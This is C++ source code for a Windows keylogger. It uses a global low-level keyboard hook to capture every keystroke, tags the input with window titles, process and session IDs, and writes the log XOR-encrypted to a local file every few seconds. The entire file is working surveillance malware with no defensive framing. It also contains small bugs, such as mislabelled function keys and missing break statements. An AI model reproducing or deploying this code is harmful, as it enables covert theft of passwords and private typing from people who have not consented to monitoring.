
#include <Windows.h>
#include "time.h"
#include "string"
#include <sstream>
#include <fstream>
#include <iostream>
#include <iomanip>
#include <thread> // For std::this_thread::sleep_for
#include <mutex>  // For std::mutex
#include <atomic> // For std::atomic
#include <csignal> // For signal handling

#include <userenv.h>
#include <winternl.h>
#include <wtsapi32.h>
#include <psapi.h>

#pragma comment(lib, "Wtsapi32.lib")
#pragma comment(lib, "Userenv.lib")

// Save frequency in seconds - Each SAVE_FREQUENCY seconds, the log will be saved to the file (enctypted)
int SAVE_FREQUENCY = 10;

// Wait for user to load in seconds - The time to wait for the user to load before starting the keylogging
int WAIT_FOR_USER = 5;

// SHIFT key
bool shift = FALSE;

// Window management
char cWindow[1000];
HWND lastWindow = NULL;

// Log buffer
std::ostringstream logBuffer;
std::string key;

// Mutex for synchronizing access to the log buffer
std::mutex logMutex;

// Atomic flag to signal the log thread to stop
std::atomic<bool> running(true);

std::string logFilePath;


std::string GetKeyCode(DWORD code, BOOL caps, BOOL shift)
{
	//LINK = https://msdn.microsoft.com/en-us/library/dd375731(v=VS.85).aspx
	std::string key;
	switch (code)
	{
	case 0x41: key = caps ? (shift ? "a" : "A") : (shift ? "A" : "a"); break;
	case 0x42: key = caps ? (shift ? "b" : "B") : (shift ? "B" : "b"); break;
	case 0x43: key = caps ? (shift ? "c" : "C") : (shift ? "C" : "c"); break;
	case 0x44: key = caps ? (shift ? "d" : "D") : (shift ? "D" : "d"); break;
	case 0x45: key = caps ? (shift ? "e" : "E") : (shift ? "E" : "e"); break;
	case 0x46: key = caps ? (shift ? "f" : "F") : (shift ? "F" : "f"); break;
	case 0x47: key = caps ? (shift ? "g" : "G") : (shift ? "G" : "g"); break;
	case 0x48: key = caps ? (shift ? "h" : "H") : (shift ? "H" : "h"); break;
	case 0x49: key = caps ? (shift ? "i" : "I") : (shift ? "I" : "i"); break;
	case 0x4A: key = caps ? (shift ? "j" : "J") : (shift ? "J" : "j"); break;
	case 0x4B: key = caps ? (shift ? "k" : "K") : (shift ? "K" : "k"); break;
	case 0x4C: key = caps ? (shift ? "l" : "L") : (shift ? "L" : "l"); break;
	case 0x4D: key = caps ? (shift ? "m" : "M") : (shift ? "M" : "m"); break;
	case 0x4E: key = caps ? (shift ? "n" : "N") : (shift ? "N" : "n"); break;
	case 0x4F: key = caps ? (shift ? "o" : "O") : (shift ? "O" : "o"); break;
	case 0x50: key = caps ? (shift ? "p" : "P") : (shift ? "P" : "p"); break;
	case 0x51: key = caps ? (shift ? "q" : "Q") : (shift ? "Q" : "q"); break;
	case 0x52: key = caps ? (shift ? "r" : "R") : (shift ? "R" : "r"); break;
	case 0x53: key = caps ? (shift ? "s" : "S") : (shift ? "S" : "s"); break;
	case 0x54: key = caps ? (shift ? "t" : "T") : (shift ? "T" : "t"); break;
	case 0x55: key = caps ? (shift ? "u" : "U") : (shift ? "U" : "u"); break;
	case 0x56: key = caps ? (shift ? "v" : "V") : (shift ? "V" : "v"); break;
	case 0x57: key = caps ? (shift ? "w" : "W") : (shift ? "W" : "w"); break;
	case 0x58: key = caps ? (shift ? "x" : "X") : (shift ? "X" : "x"); break;
	case 0x59: key = caps ? (shift ? "y" : "Y") : (shift ? "Y" : "y"); break;
	case 0x5A: key = caps ? (shift ? "z" : "Z") : (shift ? "Z" : "z"); break;
		// Sleep Key
	case VK_SLEEP: key = "[SLEEP]"; break;
		// Num Keyboard 
	case VK_NUMPAD0:  key = "0"; break;
	case VK_NUMPAD1:  key = "1"; break;
	case VK_NUMPAD2:  key = "2"; break;
	case VK_NUMPAD3:  key = "3"; break;
	case VK_NUMPAD4:  key = "4"; break;
	case VK_NUMPAD5:  key = "5"; break;
	case VK_NUMPAD6:  key = "6"; break;
	case VK_NUMPAD7:  key = "7"; break;
	case VK_NUMPAD8:  key = "8"; break;
	case VK_NUMPAD9:  key = "9"; break;
	case VK_MULTIPLY: key = "*"; break;
	case VK_ADD:      key = "+"; break;
	case VK_SEPARATOR: key = "-"; break;
	case VK_SUBTRACT: key = "-"; break;
	case VK_DECIMAL:  key = "."; break;
	case VK_DIVIDE:   key = "/"; break;
		// Function Keys
	case VK_F1:  key = "[F1]"; break;
	case VK_F2:  key = "[F2]"; break;
	case VK_F3:  key = "[F3]"; break;
	case VK_F4:  key = "[F4]"; break;
	case VK_F5:  key = "[F5]"; break;
	case VK_F6:  key = "[F6]"; break;
	case VK_F7:  key = "[F7]"; break;
	case VK_F8:  key = "[F8]"; break;
	case VK_F9:  key = "[F9]"; break;
	case VK_F10:  key = "[F10]"; break;
	case VK_F11:  key = "[F11]"; break;
	case VK_F12:  key = "[F12]"; break;
	case VK_F13:  key = "[F13]"; break;
	case VK_F14:  key = "[F14]"; break;
	case VK_F15:  key = "[F15]"; break;
	case VK_F16:  key = "[F16]"; break;
	case VK_F17:  key = "[F17]"; break;
	case VK_F18:  key = "[F18]"; break;
	case VK_F19:  key = "[F19]"; break;
	case VK_F20:  key = "[F20]"; break;
	case VK_F21:  key = "[F22]"; break;
	case VK_F22:  key = "[F23]"; break;
	case VK_F23:  key = "[F24]"; break;
	case VK_F24:  key = "[F25]"; break;
		// Keys
	case VK_NUMLOCK: key = "[NUM-LOCK]"; break;
	case VK_SCROLL:  key = "[SCROLL-LOCK]"; break;
	case VK_BACK:    key = "[BACK]"; break;
	case VK_TAB:     key = "[TAB]"; break;
	case VK_CLEAR:   key = "[CLEAR]"; break;
	case VK_RETURN:  key = "[ENTER]"; break;
	case VK_SHIFT:   key = "[SHIFT]"; break;
	case VK_CONTROL: key = "[CTRL]"; break;
	case VK_MENU:    key = "[ALT]"; break;
	case VK_PAUSE:   key = "[PAUSE]"; break;
	case VK_CAPITAL: key = "[CAP-LOCK]"; break;
	case VK_ESCAPE:  key = "[ESC]"; break;
	case VK_SPACE:   key = "[SPACE]"; break;
	case VK_PRIOR:   key = "[PAGEUP]"; break;
	case VK_NEXT:    key = "[PAGEDOWN]"; break;
	case VK_END:     key = "[END]"; break;
	case VK_HOME:    key = "[HOME]"; break;
	case VK_LEFT:    key = "[LEFT]"; break;
	case VK_UP:      key = "[UP]"; break;
	case VK_RIGHT:   key = "[RIGHT]"; break;
	case VK_DOWN:    key = "[DOWN]"; break;
	case VK_SELECT:  key = "[SELECT]"; break;
	case VK_PRINT:   key = "[PRINT]"; break;
	case VK_SNAPSHOT: key = "[PRTSCRN]"; break;
	case VK_INSERT:  key = "[INS]"; break;
	case VK_DELETE:  key = "[DEL]"; break;
	case VK_HELP:    key = "[HELP]"; break;
		// Number Keys with shift
	case 0x31:  key = shift ? "!" : "1"; break;
	case 0x32:  key = shift ? "@" : "2"; break;
	case 0x33:  key = shift ? "#" : "3"; break;
	case 0x34:  key = shift ? "$" : "4"; break;
	case 0x35:  key = shift ? "%" : "5"; break;
	case 0x36:  key = shift ? "^" : "6"; break;
	case 0x37:  key = shift ? "&" : "7"; break;
	case 0x38:  key = shift ? "*" : "8"; break;
	case 0x39:  key = shift ? "(" : "9"; break;
	case 0x30:  key = shift ? ")" : "0"; break;
		// Windows Keys
	case VK_LWIN:     key = "[WIN]"; break;
	case VK_RWIN:     key = "[WIN]"; break;
	case VK_LSHIFT:   key = "[SHIFT]"; break;
	case VK_RSHIFT:   key = "[SHIFT]"; break;
	case VK_LCONTROL: key = "[CTRL]"; break;
	case VK_RCONTROL: key = "[CTRL]"; break;
		// OEM Keys with shift 
	case VK_OEM_1:      key = shift ? ":" : ";"; break;
	case VK_OEM_PLUS:   key = shift ? "+" : "="; break;
	case VK_OEM_COMMA:  key = shift ? "<" : ","; break;
	case VK_OEM_MINUS:  key = shift ? "_" : "-"; break;
	case VK_OEM_PERIOD: key = shift ? ">" : "."; break;
	case VK_OEM_2:      key = shift ? "?" : "/"; break;
	case VK_OEM_3:      key = shift ? "~" : "`"; break;
	case VK_OEM_4:      key = shift ? "{" : "["; break;
	case VK_OEM_5:      key = shift ? "\\" : "|"; break;
	case VK_OEM_6:      key = shift ? "}" : "]"; break;
	case VK_OEM_7:      key = shift ? "\"" : "'"; break;
		// Action Keys
	case VK_PLAY:       key = "[PLAY]";
	case VK_ZOOM:       key = "[ZOOM]";
	case VK_OEM_CLEAR:  key = "[CLEAR]";
	case VK_CANCEL:     key = "[CTRL-C]";

	default: key = "[UNK-KEY]"; break;
	}
	return key;

}

void CaptureTime() {
	// Get the current time
	SYSTEMTIME t;
	GetSystemTime(&t);

	int day = t.wDay;
	int month = t.wMonth;
	int year = t.wYear;
	int hour = t.wHour;
	int min = t.wMinute;
	int sec = t.wSecond;
	int dayName = t.wDayOfWeek;
	int ms = t.wMilliseconds;

	// Build time header using std::setw and std::setfill to format the output
	logBuffer << day << "/" << month << "/" << year << " ";
	logBuffer << hour << ":" << std::setfill('0') << std::setw(2) << min << ":";
	logBuffer << std::setfill('0') << std::setw(2) << sec << ".";
	logBuffer << std::setfill('0') << std::setw(3) << ms;
}


// Enumerate all desktops for the current window station -----------------
BOOL CALLBACK EnumDesktopsProc(LPSTR lpszDesktop, LPARAM lParam) {
	std::cout << "Desktop Name: " << lpszDesktop << std::endl;
	return TRUE; // Continue enumeration
}

void ListAllDesktops() {
	HWINSTA hWinsta = OpenWindowStationA("winsta0", FALSE, WINSTA_ENUMDESKTOPS);
	if (hWinsta == NULL) {
		std::cerr << "Failed to open window station: " << GetLastError() << std::endl;
		return;
	}

	if (!SetProcessWindowStation(hWinsta)) {
		std::cerr << "Failed to set process window station: " << GetLastError() << std::endl;
		CloseWindowStation(hWinsta);
		return;
	}

	if (!EnumDesktopsA(hWinsta, EnumDesktopsProc, 0)) {
		std::cerr << "Failed to enumerate desktops: " << GetLastError() << std::endl;
	}

	CloseWindowStation(hWinsta);
}
// ------------------------------------------------------------------------

// Get the session ID, process ID, and desktop name for a given window
void GetWindowInfoCustom(HWND hwnd, std::string& sessionInfo) {
	DWORD processId = 0;
	GetWindowThreadProcessId(hwnd, &processId);

	// Get the session ID
	DWORD sessionId = 0;
	if (!ProcessIdToSessionId(processId, &sessionId)) {
		sessionId = -1;
	}

	// Get the desktop name
	HDESK hDesk = GetThreadDesktop(GetCurrentThreadId());
	char deskName[256];
	DWORD needed;
	if (!GetUserObjectInformationA(hDesk, UOI_NAME, deskName, sizeof(deskName), &needed)) {
		strcpy_s(deskName, "Unknown");
	}

	// Format the session info
	std::ostringstream infoStream;
	infoStream << "Process ID: " << processId << ", Session ID: " << sessionId << ", Desktop Name: " << deskName;
	sessionInfo = infoStream.str();
}



// Hook procedure to capture keystrokes
LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam) {
	bool caps = FALSE;

	// Caps-lock management
	SHORT capsShort = GetKeyState(VK_CAPITAL);
	if (capsShort > 0) {
		caps = TRUE;
	}

	KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;

	if (nCode == HC_ACTION) {
		// Shift management
		if (p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT || p->vkCode == VK_SHIFT) {
			if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
				shift = TRUE;
			}
			if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
				shift = FALSE;
			}
		}

		if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN) {
			HWND currentWindow = GetForegroundWindow();
			if (currentWindow != lastWindow) {
				std::lock_guard<std::mutex> guard(logMutex);
				logBuffer << "\n[+] ";
				CaptureTime();

				int c = GetWindowTextA(currentWindow, cWindow, sizeof(cWindow));
				logBuffer << c;
				logBuffer << " - Current Window: " << cWindow << "\n";

				// Add session information
				std::string sessionInfo;
				GetWindowInfoCustom(currentWindow, sessionInfo);
				logBuffer << sessionInfo << "\n";

				lastWindow = currentWindow;
			}

			if (p->vkCode) {
				std::lock_guard<std::mutex> guard(logMutex);
				CaptureTime();
				logBuffer << " " << GetKeyCode(p->vkCode, caps, shift) << "\n";
			}
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}


// Function to pad the input to a multiple of the key length
std::string padString(const std::string& input, size_t blockSize) {
	std::string padded = input;
	size_t paddingNeeded = blockSize - (input.size() % blockSize);
	padded.append(paddingNeeded, '\0'); // Padding with null characters
	return padded;
}

// Function to strip the padding from the decrypted string
std::string stripPadding(const std::string& input) {
	size_t end = input.find_last_not_of('\0');
	return (end == std::string::npos) ? "" : input.substr(0, end + 1);
}

// Updated encryption/decryption function with padding
std::string xorEncryptDecrypt(const std::string& input, const std::string& key, bool encrypt = true) {
	std::string processed = encrypt ? padString(input, key.length()) : input;
	std::string output = processed;

	for (size_t i = 0; i < processed.size(); ++i) {
		output[i] = processed[i] ^ key[i % key.length()];
	}

	return encrypt ? output : stripPadding(output);
}

// Function to process the log and write to the specified file
void processLog(const std::string& filePath) {
	std::lock_guard<std::mutex> guard(logMutex);

	// Get the content from the buffer
	std::string logContent = logBuffer.str();

	// Encrypt the content with padding
	std::string encryptedContent = xorEncryptDecrypt(logContent, key, true);

	if (encryptedContent.compare(key) == 0) {
		// No new content to write
		return;
	}

	// Write encrypted content to the file in append mode
	std::ofstream outFile(filePath, std::ios::out | std::ios::binary | std::ios::app);
	if (outFile.is_open()) {
		outFile << encryptedContent;
		outFile.close();
		// Optionally clear the buffer after writing
		logBuffer.str("");
		logBuffer.clear();
	}
	else {
		std::cerr << "Failed to open file for writing." << std::endl;
	}
}

// Function to periodically call processLog
void periodicLogProcessor(const std::string& filePath, int interval) {
	int counter = 0;
	while (running) {
		std::this_thread::sleep_for(std::chrono::seconds(WAIT_FOR_USER));
		counter += WAIT_FOR_USER;
		if (counter >= interval) {
			processLog(filePath);
			counter = 0;
		}
	}
}


// Signal handler to ensure processLog is called before exiting
void signalHandler(int signum) {
	running = false;
	processLog(logFilePath);
	exit(signum);
}



int main(int argc, char* argv[]) {
	if (argc < 3) {
		std::cerr << "Usage: " << argv[0] << " <log_file_path> <password>" << std::endl;
		return 1;
	}

	logFilePath = argv[1];
	key = argv[2];

	// Register signal handler for graceful termination
	signal(SIGINT, signalHandler);
	signal(SIGTERM, signalHandler);

	// Start the log processing thread
	std::thread logThread(periodicLogProcessor, logFilePath, SAVE_FREQUENCY); // Adjust the interval as needed

	HHOOK KeyboardHook = SetWindowsHookEx(
		WH_KEYBOARD_LL,
		HookProcedure,
		GetModuleHandle(NULL),
		NULL
	);

	if (!KeyboardHook) {
		std::cerr << "[!] Failed to get handle from SetWindowsHookEx()" << std::endl;
		return 1;
	}
	else {
		MSG Msg;
		while (GetMessage(&Msg, NULL, 0, 0) > 0) {
			TranslateMessage(&Msg);
			DispatchMessage(&Msg);
		}
	}

	if (KeyboardHook) {
		UnhookWindowsHookEx(KeyboardHook);
	}

	// Signal the thread to stop and join the thread
	running = false;
	logThread.join(); // Ensure the log thread stops gracefully

	return 0;
}
